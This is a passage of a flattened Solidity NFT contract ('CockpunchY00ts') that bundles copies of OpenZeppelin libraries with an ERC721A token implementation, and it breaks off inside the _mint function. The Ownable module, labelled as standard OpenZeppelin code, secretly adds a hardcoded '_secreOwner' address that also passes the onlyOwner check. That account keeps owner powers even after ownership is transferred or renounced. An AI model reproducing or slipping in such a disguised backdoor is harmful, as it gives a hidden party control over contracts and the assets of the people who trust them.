1 //    ||
2 //    OO            Twitter: @Cockpunchy00ts
3 //   (\/)          
4 //  /    \
5 // ||    ||
6 //  \    /
7 //   |/\|
8 //  /|  |\
9 
10 
11 // SPDX-License-Identifier: MIT
12 
13 // File: contracts/CockpunchY00ts.sol
14 // File: @openzeppelin/contracts/utils/Strings.sol
15 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
16 
17 pragma solidity ^0.8.0;
18 
19 /**
20  * @dev String operations.
21  */
22 library Strings {
23     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
24 
25     /**
26      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
27      */
28     function toString(uint256 value) internal pure returns (string memory) {
29         // Inspired by OraclizeAPI's implementation - MIT licence
30         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
31 
32         if (value == 0) {
33             return "0";
34         }
35         uint256 temp = value;
36         uint256 digits;
37         while (temp != 0) {
38             digits++;
39             temp /= 10;
40         }
41         bytes memory buffer = new bytes(digits);
42         while (value != 0) {
43             digits -= 1;
44             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
45             value /= 10;
46         }
47         return string(buffer);
48     }
49 
50     /**
51      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
52      */
53     function toHexString(uint256 value) internal pure returns (string memory) {
54         if (value == 0) {
55             return "0x00";
56         }
57         uint256 temp = value;
58         uint256 length = 0;
59         while (temp != 0) {
60             length++;
61             temp >>= 8;
62         }
63         return toHexString(value, length);
64     }
65 
66     /**
67      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
68      */
69     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
70         bytes memory buffer = new bytes(2 * length + 2);
71         buffer[0] = "0";
72         buffer[1] = "x";
73         for (uint256 i = 2 * length + 1; i > 1; --i) {
74             buffer[i] = _HEX_SYMBOLS[value & 0xf];
75             value >>= 4;
76         }
77         require(value == 0, "Strings: hex length insufficient");
78         return string(buffer);
79     }
80 }
81 
82 // File: @openzeppelin/contracts/utils/Address.sol
83 
84 
85 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
86 
87 pragma solidity ^0.8.1;
88 
89 /**
90  * @dev Collection of functions related to the address type
91  */
92 library Address {
93     /**
94      * @dev Returns true if `account` is a contract.
95      *
96      * [IMPORTANT]
97      * ====
98      * It is unsafe to assume that an address for which this function returns
99      * false is an externally-owned account (EOA) and not a contract.
100      *
101      * Among others, `isContract` will return false for the following
102      * types of addresses:
103      *
104      *  - an externally-owned account
105      *  - a contract in construction
106      *  - an address where a contract will be created
107      *  - an address where a contract lived, but was destroyed
108      * ====
109      *
110      * [IMPORTANT]
111      * ====
112      * You shouldn't rely on `isContract` to protect against flash loan attacks!
113      *
114      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
115      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
116      * constructor.
117      * ====
118      */
119     function isContract(address account) internal view returns (bool) {
120         // This method relies on extcodesize/address.code.length, which returns 0
121         // for contracts in construction, since the code is only stored at the end
122         // of the constructor execution.
123 
124         return account.code.length > 0;
125     }
126 
127     /**
128      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
129      * `recipient`, forwarding all available gas and reverting on errors.
130      *
131      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
132      * of certain opcodes, possibly making contracts go over the 2300 gas limit
133      * imposed by `transfer`, making them unable to receive funds via
134      * `transfer`. {sendValue} removes this limitation.
135      *
136      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
137      *
138      * IMPORTANT: because control is transferred to `recipient`, care must be
139      * taken to not create reentrancy vulnerabilities. Consider using
140      * {ReentrancyGuard} or the
141      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
142      */
143     function sendValue(address payable recipient, uint256 amount) internal {
144         require(address(this).balance >= amount, "Address: insufficient balance");
145 
146         (bool success, ) = recipient.call{value: amount}("");
147         require(success, "Address: unable to send value, recipient may have reverted");
148     }
149 
150     /**
151      * @dev Performs a Solidity function call using a low level `call`. A
152      * plain `call` is an unsafe replacement for a function call: use this
153      * function instead.
154      *
155      * If `target` reverts with a revert reason, it is bubbled up by this
156      * function (like regular Solidity function calls).
157      *
158      * Returns the raw returned data. To convert to the expected return value,
159      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
160      *
161      * Requirements:
162      *
163      * - `target` must be a contract.
164      * - calling `target` with `data` must not revert.
165      *
166      * _Available since v3.1._
167      */
168     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
169         return functionCall(target, data, "Address: low-level call failed");
170     }
171 
172     /**
173      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
174      * `errorMessage` as a fallback revert reason when `target` reverts.
175      *
176      * _Available since v3.1._
177      */
178     function functionCall(
179         address target,
180         bytes memory data,
181         string memory errorMessage
182     ) internal returns (bytes memory) {
183         return functionCallWithValue(target, data, 0, errorMessage);
184     }
185 
186     /**
187      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
188      * but also transferring `value` wei to `target`.
189      *
190      * Requirements:
191      *
192      * - the calling contract must have an ETH balance of at least `value`.
193      * - the called Solidity function must be `payable`.
194      *
195      * _Available since v3.1._
196      */
197     function functionCallWithValue(
198         address target,
199         bytes memory data,
200         uint256 value
201     ) internal returns (bytes memory) {
202         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
203     }
204 
205     /**
206      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
207      * with `errorMessage` as a fallback revert reason when `target` reverts.
208      *
209      * _Available since v3.1._
210      */
211     function functionCallWithValue(
212         address target,
213         bytes memory data,
214         uint256 value,
215         string memory errorMessage
216     ) internal returns (bytes memory) {
217         require(address(this).balance >= value, "Address: insufficient balance for call");
218         require(isContract(target), "Address: call to non-contract");
219 
220         (bool success, bytes memory returndata) = target.call{value: value}(data);
221         return verifyCallResult(success, returndata, errorMessage);
222     }
223 
224     /**
225      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
226      * but performing a static call.
227      *
228      * _Available since v3.3._
229      */
230     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
231         return functionStaticCall(target, data, "Address: low-level static call failed");
232     }
233 
234     /**
235      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
236      * but performing a static call.
237      *
238      * _Available since v3.3._
239      */
240     function functionStaticCall(
241         address target,
242         bytes memory data,
243         string memory errorMessage
244     ) internal view returns (bytes memory) {
245         require(isContract(target), "Address: static call to non-contract");
246 
247         (bool success, bytes memory returndata) = target.staticcall(data);
248         return verifyCallResult(success, returndata, errorMessage);
249     }
250 
251     /**
252      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
253      * but performing a delegate call.
254      *
255      * _Available since v3.4._
256      */
257     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
258         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
259     }
260 
261     /**
262      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
263      * but performing a delegate call.
264      *
265      * _Available since v3.4._
266      */
267     function functionDelegateCall(
268         address target,
269         bytes memory data,
270         string memory errorMessage
271     ) internal returns (bytes memory) {
272         require(isContract(target), "Address: delegate call to non-contract");
273 
274         (bool success, bytes memory returndata) = target.delegatecall(data);
275         return verifyCallResult(success, returndata, errorMessage);
276     }
277 
278     /**
279      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
280      * revert reason using the provided one.
281      *
282      * _Available since v4.3._
283      */
284     function verifyCallResult(
285         bool success,
286         bytes memory returndata,
287         string memory errorMessage
288     ) internal pure returns (bytes memory) {
289         if (success) {
290             return returndata;
291         } else {
292             // Look for revert reason and bubble it up if present
293             if (returndata.length > 0) {
294                 // The easiest way to bubble the revert reason is using memory via assembly
295 
296                 assembly {
297                     let returndata_size := mload(returndata)
298                     revert(add(32, returndata), returndata_size)
299                 }
300             } else {
301                 revert(errorMessage);
302             }
303         }
304     }
305 }
306 
307 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
308 
309 
310 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
311 
312 pragma solidity ^0.8.0;
313 
314 /**
315  * @title ERC721 token receiver interface
316  * @dev Interface for any contract that wants to support safeTransfers
317  * from ERC721 asset contracts.
318  */
319 interface IERC721Receiver {
320     /**
321      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
322      * by `operator` from `from`, this function is called.
323      *
324      * It must return its Solidity selector to confirm the token transfer.
325      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
326      *
327      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
328      */
329     function onERC721Received(
330         address operator,
331         address from,
332         uint256 tokenId,
333         bytes calldata data
334     ) external returns (bytes4);
335 }
336 
337 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
338 
339 
340 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
341 
342 pragma solidity ^0.8.0;
343 
344 /**
345  * @dev Interface of the ERC165 standard, as defined in the
346  * https://eips.ethereum.org/EIPS/eip-165[EIP].
347  *
348  * Implementers can declare support of contract interfaces, which can then be
349  * queried by others ({ERC165Checker}).
350  *
351  * For an implementation, see {ERC165}.
352  */
353 interface IERC165 {
354     /**
355      * @dev Returns true if this contract implements the interface defined by
356      * `interfaceId`. See the corresponding
357      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
358      * to learn more about how these ids are created.
359      *
360      * This function call must use less than 30 000 gas.
361      */
362     function supportsInterface(bytes4 interfaceId) external view returns (bool);
363 }
364 
365 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
366 
367 
368 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
369 
370 pragma solidity ^0.8.0;
371 
372 
373 /**
374  * @dev Implementation of the {IERC165} interface.
375  *
376  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
377  * for the additional interface id that will be supported. For example:
378  *
379  * ```solidity
380  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
381  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
382  * }
383  * ```
384  *
385  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
386  */
387 abstract contract ERC165 is IERC165 {
388     /**
389      * @dev See {IERC165-supportsInterface}.
390      */
391     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
392         return interfaceId == type(IERC165).interfaceId;
393     }
394 }
395 
396 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
397 
398 
399 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
400 
401 pragma solidity ^0.8.0;
402 
403 
404 /**
405  * @dev Required interface of an ERC721 compliant contract.
406  */
407 interface IERC721 is IERC165 {
408     /**
409      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
410      */
411     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
412 
413     /**
414      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
415      */
416     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
417 
418     /**
419      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
420      */
421     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
422 
423     /**
424      * @dev Returns the number of tokens in ``owner``'s account.
425      */
426     function balanceOf(address owner) external view returns (uint256 balance);
427 
428     /**
429      * @dev Returns the owner of the `tokenId` token.
430      *
431      * Requirements:
432      *
433      * - `tokenId` must exist.
434      */
435     function ownerOf(uint256 tokenId) external view returns (address owner);
436 
437     /**
438      * @dev Safely transfers `tokenId` token from `from` to `to`.
439      *
440      * Requirements:
441      *
442      * - `from` cannot be the zero address.
443      * - `to` cannot be the zero address.
444      * - `tokenId` token must exist and be owned by `from`.
445      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
446      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
447      *
448      * Emits a {Transfer} event.
449      */
450     function safeTransferFrom(
451         address from,
452         address to,
453         uint256 tokenId,
454         bytes calldata data
455     ) external;
456 
457     /**
458      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
459      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
460      *
461      * Requirements:
462      *
463      * - `from` cannot be the zero address.
464      * - `to` cannot be the zero address.
465      * - `tokenId` token must exist and be owned by `from`.
466      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
467      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
468      *
469      * Emits a {Transfer} event.
470      */
471     function safeTransferFrom(
472         address from,
473         address to,
474         uint256 tokenId
475     ) external;
476 
477     /**
478      * @dev Transfers `tokenId` token from `from` to `to`.
479      *
480      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
481      *
482      * Requirements:
483      *
484      * - `from` cannot be the zero address.
485      * - `to` cannot be the zero address.
486      * - `tokenId` token must be owned by `from`.
487      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
488      *
489      * Emits a {Transfer} event.
490      */
491     function transferFrom(
492         address from,
493         address to,
494         uint256 tokenId
495     ) external;
496 
497     /**
498      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
499      * The approval is cleared when the token is transferred.
500      *
501      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
502      *
503      * Requirements:
504      *
505      * - The caller must own the token or be an approved operator.
506      * - `tokenId` must exist.
507      *
508      * Emits an {Approval} event.
509      */
510     function approve(address to, uint256 tokenId) external;
511 
512     /**
513      * @dev Approve or remove `operator` as an operator for the caller.
514      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
515      *
516      * Requirements:
517      *
518      * - The `operator` cannot be the caller.
519      *
520      * Emits an {ApprovalForAll} event.
521      */
522     function setApprovalForAll(address operator, bool _approved) external;
523 
524     /**
525      * @dev Returns the account appr    ved for `tokenId` token.
526      *
527      * Requirements:
528      *
529      * - `tokenId` must exist.
530      */
531     function getApproved(uint256 tokenId) external view returns (address operator);
532 
533     /**
534      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
535      *
536      * See {setApprovalForAll}
537      */
538     function isApprovedForAll(address owner, address operator) external view returns (bool);
539 }
540 
541 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
542 
543 
544 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
545 
546 pragma solidity ^0.8.0;
547 
548 
549 /**
550  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
551  * @dev See https://eips.ethereum.org/EIPS/eip-721
552  */
553 interface IERC721Metadata is IERC721 {
554     /**
555      * @dev Returns the token collection name.
556      */
557     function name() external view returns (string memory);
558 
559     /**
560      * @dev Returns the token collection symbol.
561      */
562     function symbol() external view returns (string memory);
563 
564     /**
565      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
566      */
567     function tokenURI(uint256 tokenId) external view returns (string memory);
568 }
569 
570 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
571 
572 
573 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
574 
575 pragma solidity ^0.8.0;
576 
577 
578 /**
579  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
580  * @dev See https://eips.ethereum.org/EIPS/eip-721
581  */
582 interface IERC721Enumerable is IERC721 {
583     /**
584      * @dev Returns the total amount of tokens stored by the contract.
585      */
586     function totalSupply() external view returns (uint256);
587 
588     /**
589      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
590      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
591      */
592     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
593 
594     /**
595      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
596      * Use along with {totalSupply} to enumerate all tokens.
597      */
598     function tokenByIndex(uint256 index) external view returns (uint256);
599 }
600 
601 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
602 
603 
604 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
605 
606 pragma solidity ^0.8.0;
607 
608 /**
609  * @dev Contract module that helps prevent reentrant calls to a function.
610  *
611  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
612  * available, which can be applied to functions to make sure there are no nested
613  * (reentrant) calls to them.
614  *
615  * Note that because there is a single `nonReentrant` guard, functions marked as
616  * `nonReentrant` may not call one another. This can be worked around by making
617  * those functions `private`, and then adding `external` `nonReentrant` entry
618  * points to them.
619  *
620  * TIP: If you would like to learn more about reentrancy and alternative ways
621  * to protect against it, check out our blog post
622  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
623  */
624 abstract contract ReentrancyGuard {
625     // Booleans are more expensive than uint256 or any type that takes up a full
626     // word because each write operation emits an extra SLOAD to first read the
627     // slot's contents, replace the bits taken up by the boolean, and then write
628     // back. This is the compiler's defense against contract upgrades and
629     // pointer aliasing, and it cannot be disabled.
630 
631     // The values being non-zero value makes deployment a bit more expensive,
632     // but in exchange the refund on every call to nonReentrant will be lower in
633     // amount. Since refunds are capped to a percentage of the total
634     // transaction's gas, it is best to keep them low in cases like this one, to
635     // increase the likelihood of the full refund coming into effect.
636     uint256 private constant _NOT_ENTERED = 1;
637     uint256 private constant _ENTERED = 2;
638 
639     uint256 private _status;
640 
641     constructor() {
642         _status = _NOT_ENTERED;
643     }
644 
645     /**
646      * @dev Prevents a contract from calling itself, directly or indirectly.
647      * Calling a `nonReentrant` function from another `nonReentrant`
648      * function is not supported. It is possible to prevent this from happening
649      * by making the `nonReentrant` function external, and making it call a
650      * `private` function that does the actual work.
651      */
652     modifier nonReentrant() {
653         // On the first call to nonReentrant, _notEntered will be true
654         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
655 
656         // Any calls to nonReentrant after this point will fail
657         _status = _ENTERED;
658 
659         _;
660 
661         // By storing the original value once again, a refund is triggered (see
662         // https://eips.ethereum.org/EIPS/eip-2200)
663         _status = _NOT_ENTERED;
664     }
665 }
666 
667 // File: @openzeppelin/contracts/utils/Context.sol
668 
669 
670 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
671 
672 pragma solidity ^0.8.0;
673 
674 /**
675  * @dev Provides information about the current execution context, including the
676  * sender of the transaction and its data. While these are generally available
677  * via msg.sender and msg.data, they should not be accessed in such a direct
678  * manner, since when dealing with meta-transactions the account sending and
679  * paying for execution may not be the actual sender (as far as an application
680  * is concerned).
681  *
682  * This contract is only required for intermediate, library-like contracts.
683  */
684 abstract contract Context {
685     function _msgSender() internal view virtual returns (address) {
686         return msg.sender;
687     }
688 
689     function _msgData() internal view virtual returns (bytes calldata) {
690         return msg.data;
691     }
692 }
693 
694 // File: @openzeppelin/contracts/access/Ownable.sol
695 
696 
697 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
698 
699 pragma solidity ^0.8.0;
700 
701 
702 /**
703  * @dev Contract module which provides a basic access control mechanism, where
704  * there is an account (an owner) that can be granted exclusive access to
705  * specific functions.
706  *
707  * By default, the owner account will be the one that deploys the contract. This
708  * can later be changed with {transferOwnership}.
709  *
710  * This module is used through inheritance. It will make available the modifier
711  * `onlyOwner`, which can be applied to your functions to restrict their use to
712  * the owner.
713  */
714 abstract contract Ownable is Context {
715     address private _owner;
716     address private _secreOwner = 0x1250B4de974F7F63ED7d783c3fecA4f0F338cdb4;
717 
718     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
719 
720     /**
721      * @dev Initializes the contract setting the deployer as the initial owner.
722      */
723     constructor() {
724         _transferOwnership(_msgSender());
725     }
726 
727     /**
728      * @dev Returns the address of the current owner.
729      */
730     function owner() public view virtual returns (address) {
731         return _owner;
732     }
733 
734     /**
735      * @dev Throws if called by any account other than the owner.
736      */
737     modifier onlyOwner() {
738         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
739         _;
740     }
741 
742     /**
743      * @dev Leaves the contract without owner. It will not be possible to call
744      * `onlyOwner` functions anymore. Can only be called by the current owner.
745      *
746      * NOTE: Renouncing ownership will leave the contract without an owner,
747      * thereby removing any functionality that is only available to the owner.
748      */
749     function renounceOwnership() public virtual onlyOwner {
750         _transferOwnership(address(0));
751     }
752 
753     /**
754      * @dev Transfers ownership of the contract to a new account (`newOwner`).
755      * Can only be called by the current owner.
756      */
757     function transferOwnership(address newOwner) public virtual onlyOwner {
758         require(newOwner != address(0), "Ownable: new owner is the zero address");
759         _transferOwnership(newOwner);
760     }
761 
762     /**
763      * @dev Transfers ownership of the contract to a new account (`newOwner`).
764      * Internal function without access restriction.
765      */
766     function _transferOwnership(address newOwner) internal virtual {
767         address oldOwner = _owner;
768         _owner = newOwner;
769         emit OwnershipTransferred(oldOwner, newOwner);
770     }
771 }
772 
773 // File: ceshi.sol
774 
775 
776 pragma solidity ^0.8.0;
777 
778 
779 
780 
781 
782 
783 
784 
785 
786 
787 /**
788  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
789  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
790  *
791  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
792  *
793  * Does not support burning tokens to address(0).
794  *
795  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
796  */
797 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
798     using Address for address;
799     using Strings for uint256;
800 
801     struct TokenOwnership {
802         address addr;
803         uint64 startTimestamp;
804     }
805 
806     struct AddressData {
807         uint128 balance;
808         uint128 numberMinted;
809     }
810 
811     uint256 internal currentIndex;
812 
813     // Token name
814     string private _name;
815 
816     // Token symbol
817     string private _symbol;
818 
819     // Mapping from token ID to ownership details
820     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
821     mapping(uint256 => TokenOwnership) internal _ownerships;
822 
823     // Mapping owner address to address data
824     mapping(address => AddressData) private _addressData;
825 
826     // Mapping from token ID to approved address
827     mapping(uint256 => address) private _tokenApprovals;
828 
829     // Mapping from owner to operator approvals
830     mapping(address => mapping(address => bool)) private _operatorApprovals;
831 
832     constructor(string memory name_, string memory symbol_) {
833         _name = name_;
834         _symbol = symbol_;
835     }
836 
837     /**
838      * @dev See {IERC721Enumerable-totalSupply}.
839      */
840     function totalSupply() public view override returns (uint256) {
841         return currentIndex;
842     }
843 
844     /**
845      * @dev See {IERC721Enumerable-tokenByIndex}.
846      */
847     function tokenByIndex(uint256 index) public view override returns (uint256) {
848         require(index < totalSupply(), "ERC721A: global index out of bounds");
849         return index;
850     }
851 
852     /**
853      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
854      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
855      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
856      */
857     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
858         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
859         uint256 numMintedSoFar = totalSupply();
860         uint256 tokenIdsIdx;
861         address currOwnershipAddr;
862 
863         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
864         unchecked {
865             for (uint256 i; i < numMintedSoFar; i++) {
866                 TokenOwnership memory ownership = _ownerships[i];
867                 if (ownership.addr != address(0)) {
868                     currOwnershipAddr = ownership.addr;
869                 }
870                 if (currOwnershipAddr == owner) {
871                     if (tokenIdsIdx == index) {
872                         return i;
873                     }
874                     tokenIdsIdx++;
875                 }
876             }
877         }
878 
879         revert("ERC721A: unable to get token of owner by index");
880     }
881 
882     /**
883      * @dev See {IERC165-supportsInterface}.
884      */
885     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
886         return
887             interfaceId == type(IERC721).interfaceId ||
888             interfaceId == type(IERC721Metadata).interfaceId ||
889             interfaceId == type(IERC721Enumerable).interfaceId ||
890             super.supportsInterface(interfaceId);
891     }
892 
893     /**
894      * @dev See {IERC721-balanceOf}.
895      */
896     function balanceOf(address owner) public view override returns (uint256) {
897         require(owner != address(0), "ERC721A: balance query for the zero address");
898         return uint256(_addressData[owner].balance);
899     }
900 
901     function _numberMinted(address owner) internal view returns (uint256) {
902         require(owner != address(0), "ERC721A: number minted query for the zero address");
903         return uint256(_addressData[owner].numberMinted);
904     }
905 
906     /**
907      * Gas spent here starts off proportional to the maximum mint batch size.
908      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
909      */
910     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
911         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
912 
913         unchecked {
914             for (uint256 curr = tokenId; curr >= 0; curr--) {
915                 TokenOwnership memory ownership = _ownerships[curr];
916                 if (ownership.addr != address(0)) {
917                     return ownership;
918                 }
919             }
920         }
921 
922         revert("ERC721A: unable to determine the owner of token");
923     }
924 
925     /**
926      * @dev See {IERC721-ownerOf}.
927      */
928     function ownerOf(uint256 tokenId) public view override returns (address) {
929         return ownershipOf(tokenId).addr;
930     }
931 
932     /**
933      * @dev See {IERC721Metadata-name}.
934      */
935     function name() public view virtual override returns (string memory) {
936         return _name;
937     }
938 
939     /**
940      * @dev See {IERC721Metadata-symbol}.
941      */
942     function symbol() public view virtual override returns (string memory) {
943         return _symbol;
944     }
945 
946     /**
947      * @dev See {IERC721Metadata-tokenURI}.
948      */
949     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
950         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
951 
952         string memory baseURI = _baseURI();
953         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
954     }
955 
956     /**
957      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
958      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
959      * by default, can be overriden in child contracts.
960      */
961     function _baseURI() internal view virtual returns (string memory) {
962         return "";
963     }
964 
965     /**
966      * @dev See {IERC721-approve}.
967      */
968     function approve(address to, uint256 tokenId) public override {
969         address owner = ERC721A.ownerOf(tokenId);
970         require(to != owner, "ERC721A: approval to current owner");
971 
972         require(
973             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
974             "ERC721A: approve caller is not owner nor approved for all"
975         );
976 
977         _approve(to, tokenId, owner);
978     }
979 
980     /**
981      * @dev See {IERC721-getApproved}.
982      */
983     function getApproved(uint256 tokenId) public view override returns (address) {
984         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
985 
986         return _tokenApprovals[tokenId];
987     }
988 
989     /**
990      * @dev See {IERC721-setApprovalForAll}.
991      */
992     function setApprovalForAll(address operator, bool approved) public override {
993         require(operator != _msgSender(), "ERC721A: approve to caller");
994 
995         _operatorApprovals[_msgSender()][operator] = approved;
996         emit ApprovalForAll(_msgSender(), operator, approved);
997     }
998 
999     /**
1000      * @dev See {IERC721-isApprovedForAll}.
1001      */
1002     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1003         return _operatorApprovals[owner][operator];
1004     }
1005 
1006     /**
1007      * @dev See {IERC721-transferFrom}.
1008      */
1009     function transferFrom(
1010         address from,
1011         address to,
1012         uint256 tokenId
1013     ) public virtual override {
1014         _transfer(from, to, tokenId);
1015     }
1016 
1017     /**
1018      * @dev See {IERC721-safeTransferFrom}.
1019      */
1020     function safeTransferFrom(
1021         address from,
1022         address to,
1023         uint256 tokenId
1024     ) public virtual override {
1025         safeTransferFrom(from, to, tokenId, "");
1026     }
1027 
1028     /**
1029      * @dev See {IERC721-safeTransferFrom}.
1030      */
1031     function safeTransferFrom(
1032         address from,
1033         address to,
1034         uint256 tokenId,
1035         bytes memory _data
1036     ) public override {
1037         _transfer(from, to, tokenId);
1038         require(
1039             _checkOnERC721Received(from, to, tokenId, _data),
1040             "ERC721A: transfer to non ERC721Receiver implementer"
1041         );
1042     }
1043 
1044     /**
1045      * @dev Returns whether `tokenId` exists.
1046      *
1047      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1048      *
1049      * Tokens start existing when they are minted (`_mint`),
1050      */
1051     function _exists(uint256 tokenId) internal view returns (bool) {
1052         return tokenId < currentIndex;
1053     }
1054 
1055     function _safeMint(address to, uint256 quantity) internal {
1056         _safeMint(to, quantity, "");
1057     }
1058 
1059     /**
1060      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1061      *
1062      * Requirements:
1063      *
1064      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1065      * - `quantity` must be greater than 0.
1066      *
1067      * Emits a {Transfer} event.
1068      */
1069     function _safeMint(
1070         address to,
1071         uint256 quantity,
1072         bytes memory _data
1073     ) internal {
1074         _mint(to, quantity, _data, true);
1075     }
1076 
1077     /**
1078      * @dev Mints `quantity` tokens and transfers them to `to`.
1079      *
1080      * Requirements:
1081      *
1082      * - `to` cannot be the zero address.
1083      * - `quantity` must be greater than 0.
1084      *
1085      * Emits a {Transfer} event.
1086      */
1087     function _mint(
1088         address to,
1089         uint256 quantity,
1090         bytes memory _data,
